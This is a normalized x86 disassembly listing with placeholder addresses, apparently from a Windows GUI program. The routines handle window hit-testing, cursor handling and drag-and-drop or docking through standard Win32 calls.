test eax eax
jne r-xdata
mov esi eax
mov eax esi
call sub_44f7d8
mov edi eax
mov [ ebp - 0x18 ] edi
cmp edi [ ebp - 0x14 ]
je r-xdata
mov esi eax
mov eax esi
call sub_44f7d8
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov edx [ ebp + 0x8 ]
mov esi eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_44f7d8
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call GetWindowRect
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
push eax
mov eax [ ebp + 0x8 ]
dec eax
push eax
lea ecx [ ebp - 0x3c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax ebx
mov si 0xffbd
call sub_403324
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x9 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax - 0x5 ]
mov [ ebp - 0xc ] edx
lea eax [ ebp - 0x1c ]
push eax
push sub_44688c
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esi eax
mov eax esi
call sub_44f7d8
mov [ ebp - 0x1c ] eax
jmp r-xdata
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
mov eax [ eax + 0xa0 ]
call sub_44f7d8
cmp eax [ ebp - 0x14 ]
je r-xdata
sub_446a90
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_44f7d8
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_44f7d8
push eax
call IsChild
cmp eax 0x1
sbb eax eax
inc eax
pop ebp
retn
sub_446ad4
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov esi eax
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x10 ] edx
xor eax eax
mov [ ebp - 0x18 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x11
call GetKeyState
test ax 0x8000
setne al
mov edx [ rw-data ]
mov edx [ edx ]
xor al [ edx + 0xb4 ]
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ rw-data ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
inc ebx
xor edi edi
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_4462e8
mov [ ebp - 0x18 ] eax
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x18 ]
call sub_4468f8
pop ecx
test al al
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_418700
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
call sub_44f7d8
push eax
call IsWindowVisible
test eax eax
je r-xdata
push ebp
call sub_446a90
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xa0 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
mov [ ebp - 0x1 ] 0x1
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0x1 ]
push eax
lea ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov si 0xffbd
call sub_403324
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_44e308
dec eax
jle r-xdata
push [ ebp - 0x5 ]
push [ ebp - 0x9 ]
lea eax [ ebp - 0x28 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_446258
sub_446c30
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov edi esi
mov edx edi
mov eax [ rw-data ]
call sub_41875c
test bl bl
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
inc eax
jne r-xdata
mov edx eax
mov eax [ rw-data ]
call sub_4185f0
mov edx edi
mov eax [ rw-data ]
call sub_4185a4
jmp r-xdata
sub_446c90
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] ecx
xor ecx ecx
test eax eax
je r-xdata
mov eax ecx
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx ]
mov [ ebp - 0x18 ] ebx
mov ebx [ ecx + 0x4 ]
mov [ ebp - 0x14 ] ebx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x10 ] ecx
cmp [ rw-data ] 0x2
sete cl
mov [ ebp - 0x8 ] cl
lea ecx [ ebp - 0x18 ]
push ecx
and edx 0x7f
push edx
push 0xb02f
push eax
call SendMessageA
mov ecx eax
sub_446ce8
push ebx
push esi
push ecx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop edx
pop esi
pop ebx
retn
push esp
push esi
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_404378
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax esi
call sub_445dd8
test eax eax
setne bl
movzx eax [ rw-data ]
push eax
push esi
call GetPropA
test eax eax
setne bl
jmp r-xdata
sub_446d48
push ebx
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_446ce8
test al al
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_446d74
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
test cl cl
jne r-xdata
mov eax ebx
mov edx [ ebp + 0x8 ]
call sub_446ad4
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
call sub_446d48
mov [ esi ] eax
push 0x0
push ebx
mov eax [ esi ]
mov ecx [ rw-data ]
mov dl 0x5
call sub_446c90
mov ebx eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn 0x4
mov eax ebx
call sub_44f7d8
mov [ esi ] eax
sub_446dc4
push ebx
push esi
mov ebx eax
xor eax eax
mov edx [ rw-data ]
mov esi [ edx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
push esi
mov eax [ rw-data ]
add eax 0xc
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x8 ]
mov ecx [ rw-data ]
mov edx ebx
call sub_446c90
cmp eax 0x1
sbb eax eax
inc eax
sub_446e00
push ebx
push esi
push edi
xor edi edi
mov eax [ rw-data ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
cmp [ esi + 0x178 ] 0x0
je r-xdata
mov eax esi
call sub_44e274
test eax eax
je r-xdata
mov eax esi
call sub_44e274
dec eax
jne r-xdata
mov eax [ rw-data ]
add eax 0xc
xor edx edx
call sub_447830
mov ebx eax
jmp r-xdata
xor edx edx
mov eax [ esi + 0x178 ]
call sub_418700
mov edx [ rw-data ]
cmp eax [ edx + 0x38 ]
je r-xdata
test ebx ebx
je r-xdata
cmp esi ebx
jne r-xdata
mov edx ebx
mov eax [ esi + 0x178 ]
call sub_41875c
cmp eax 0xffffffff
je r-xdata
mov ebx [ ebx + 0x30 ]
mov edx eax
mov eax esi
call sub_44e288
mov edi eax
jmp r-xdata
sub_446e94
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
mov cl [ eax + 0x9b ]
lea edx [ esp + 0x4 ]
mov eax edi
call sub_446d74
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
sub eax [ edi ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jge r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x9b ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
sub eax [ edi + 0x4 ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jl r-xdata
cmp [ rw-data ] 0x0
setne [ esp + 0x4 ]
mov [ rw-data ] 0x2
mov [ rw-data ] 0x1
mov [ esp + 0x4 ] 0x0
jmp r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_4512dc
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov al 0x1
call sub_446dc4
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x4 ]
je r-xdata
mov eax [ edi + 0x4 ]
push eax
mov al 0x2
call sub_446dc4
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
call sub_448af0
mov eax [ rw-data ]
mov edx [ esp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ esp + 0xc ]
mov [ eax + 0x18 ] edx
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov eax [ rw-data ]
mov edx [ esp ]
mov [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
xor eax eax
call sub_446dc4
cmp [ rw-data ] 0x0
je r-xdata
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46752c
push eax
call SetCursor
cmp [ rw-data ] 0x2
jne r-xdata
test ebx ebx
je r-xdata
test ebx ebx
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_451298
mov eax [ rw-data ]
cmp [ eax + 0x6a ] 0x0
jne r-xdata
test [ ebx + 0x51 ] 0x20
je r-xdata
call sub_446e00
mov ebx eax
mov eax [ rw-data ]
mov [ eax + 0x58 ] ebx
test ebx ebx
jne r-xdata
mov edx [ edi + 0x4 ]
push edx
mov ecx [ edi ]
mov eax [ rw-data ]
mov edx [ eax + 0x38 ]
xchg edx eax
mov si 0xffe7
call sub_403324
jmp r-xdata
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ rw-data ]
call sub_4513c4
jmp r-xdata
mov eax [ edi + 0x4 ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
call sub_4512dc
jmp r-xdata
mov eax [ rw-data ]
call sub_451438
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46752c
push eax
call SetCursor
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax ebx
call sub_448af0
lea edx [ esp + 0x8 ]
mov eax ebx
mov si 0xffd8
call sub_403324
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
mov eax [ rw-data ]
lea edx [ eax + 0x14 ]
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov si 0xffd8
call sub_403324
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ rw-data ]
lea edx [ ebx + 0x5c ]
lea eax [ ebx + 0x44 ]
mov ecx 0x10
call sub_407e00
test al al
jne r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ rw-data ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x34 ]
sub_447164
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov ebx edx
mov esi eax
mov [ rw-data ] esi
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x4 ] edx
push rw-data
call GetCursorPos
mov eax [ rw-data ]
mov edx [ rw-data ]
mov [ eax + 0xc ] edx
mov edx [ rw-data ]
mov [ eax + 0x10 ] edx
call GetCursor
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_44638c
mov [ rw-data ] eax
mov [ rw-data ] edi
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
test bl bl
je r-xdata
mov edx esi
lea eax [ edx + 0x44 ]
mov edi [ eax + 0x8 ]
mov ecx [ eax ]
sub edi ecx
test edi edi
jle r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x1
jmp r-xdata
xor ecx ecx
mov [ edx + 0x20 ] ecx
mov [ edx + 0x24 ] ecx
mov edi [ edx + 0xc ]
sub edi ecx
mov [ esp ] edi
fild [ esp ]
mov ecx [ eax + 0x8 ]
sub ecx [ eax ]
mov [ esp + 0x4 ] ecx
fild [ esp + 0x4 ]
fdivp st1
fstp [ edx + 0x20 ]
fwait
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_4512dc
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov ecx esi
mov edi [ ecx + 0x10 ]
sub edi edx
mov [ esp ] edi
fild [ esp ]
mov edx [ eax + 0xc ]
sub edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
fild [ esp + 0x4 ]
fdivp st1
fstp [ ecx + 0x28 ]
fwait
jmp r-xdata
mov ecx [ eax + 0xc ]
mov edx [ eax + 0x4 ]
sub ecx edx
test ecx ecx
jle r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax rw-data
call sub_446e94
mov [ rw-data ] 0x0
jmp r-xdata
mov [ rw-data ] 0x2
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
jmp r-xdata
test bl bl
je r-xdata
sub_4472d4
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov edi eax
mov [ rw-data ] edi
xor edx edx
push ebp
push sub_447479
push [ fs : edx ]
mov [ fs : edx ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x0
cmp [ edi + 0x9b ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffe3
call sub_403324
cmp [ rw-data ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffdc
call sub_403324
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_446698
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_447164
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_446580
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
cmp [ esi + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x44
push eax
mov eax esi
call sub_44f7d8
push eax
call GetWindowRect
jmp r-xdata
lea ecx [ ebp - 0x20 ]
xor edx edx
xor eax eax
call sub_417088
lea edx [ ebp - 0x20 ]
lea ecx [ ebp - 0x18 ]
mov eax esi
call sub_448ac4
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x48 ] edx
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x10 ]
push eax
call GetCursorPos
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x48 ] edx
jmp r-xdata
mov esi [ ebp - 0x8 ]
mov edx [ esi + 0x48 ]
mov eax [ ebp - 0x8 ]
mov edi [ eax + 0x38 ]
add edx [ edi + 0x4c ]
mov eax [ esi + 0x44 ]
add eax [ edi + 0x48 ]
lea ecx [ ebp - 0x18 ]
call sub_417088
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x4c ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x50 ] edx
sub_447498
push ebp
mov ebp esp
push ebx
push esi
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
setne bl
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov bl 0x1
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
mov ecx [ rw-data ]
mov si 0xffbe
call sub_403324
mov ebx eax
sub_44750c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] al
xor ebx ebx
mov [ ebp - 0x2 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_4477d8
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ rw-data ] eax
xor edx edx
push ebp
push sub_447766
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x1
mov eax [ rw-data ]
mov dl [ ebp - 0x1 ]
mov [ eax + 0x1c ] dl
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_4463d4
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4032d8
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
cmp [ ebx + 0x4 ] 0x0
sete al
mov [ ebx + 0x6c ] al
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x10 ]
mov [ ebp - 0x6 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
xor eax eax
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax + 0x14 ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x18 ]
mov [ ebp - 0x6 ] edx
jmp r-xdata
mov [ ebp - 0x2 ] al
cmp [ rw-data ] 0x2
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
push ebp
call sub_447498
pop ecx
test al al
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebp - 0x2 ] 0x0
je r-xdata
mov al 0x1
call sub_446dc4
test al al
je r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call SetCursor
mov eax [ rw-data ]
call sub_451438
jmp r-xdata
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44776d
mov eax [ rw-data ]
call sub_403128
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_4607d8
test eax eax
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x0
mov eax [ ebp - 0x6 ]
push eax
mov al [ ebp - 0x2 ]
push eax
mov eax [ rw-data ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xa ]
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx ]
mov al 0x3
cmp [ ebp - 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
xor ecx ecx
mov edx 0xb03a
mov eax [ rw-data ]
call sub_44a198
jmp r-xdata
mov edx [ eax + 0x220 ]
cmp edx [ ebx + 0x38 ]
jne r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ rw-data ]
add edx 0xc
push edx
mov edx [ rw-data ]
mov edx [ edx + 0x8 ]
mov ecx [ rw-data ]
xchg edx eax
call sub_446c90
mov al 0x4
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0xc ] ecx
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0x10 ] ecx
xor edx edx
mov [ ebp - 0xa ] edx
xor edx edx
mov [ ebp - 0x6 ] edx
xor edx edx
call sub_464444
sub_44776d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
retn
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
jne r-xdata
mov eax [ rw-data ]
call sub_403128
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
jne r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
sub_4477fc
push ebx
push esi
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_445e0c
mov esi eax
test esi esi
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_447830
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor esi esi
mov eax edi
call sub_4477fc
mov ebp eax
test ebp ebp
je r-xdata
mov eax esi
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi ebp
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax ebp
call sub_448af0
lea edx [ esp + 0x4 ]
mov ecx ebx
mov eax ebp
call sub_44d0c4
test eax eax
je r-xdata
mov esi eax
sub_447878
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx esi
call sub_4185a4
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebx ] eax
sub_4478a0
push ebx
mov ebx eax
mov eax [ ebx ]
call sub_41889c
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx ]
call sub_403128
xor eax eax
mov [ ebx ] eax
sub_4478c0
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
push esp
push ebx
call GetWindowOrgEx
push 0x0
mov eax [ esp + 0x8 ]
sub eax edi
push eax
mov eax [ esp + 0x8 ]
sub eax esi
push eax
push ebx
call SetWindowOrgEx
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_4478f0
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ rw-data ]
call sub_418ac4
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4479a0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_418b28
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0xc ]
jne r-xdata
xor eax eax
push ebp
push sub_447979
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
call sub_447b2c
call sub_4039a0
call sub_4039a0
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_418700
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
call sub_4250f8
test al al
je r-xdata
mov esp ebp
pop ebp
retn
sub_4479ac
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_418ac4
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_447a4a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447a51
mov eax [ rw-data ]
call sub_418b28
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_447a22
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_447b2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_425154
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_418700
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_4250f8
test al al
je r-xdata
sub_447a58
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
mov eax esi
call sub_447b2c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_424cdc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_447a84
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4252fc
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_425300
mov eax [ ebp - 0x4 ]
call sub_447b78
mov eax [ rw-data ]
call sub_418ac4
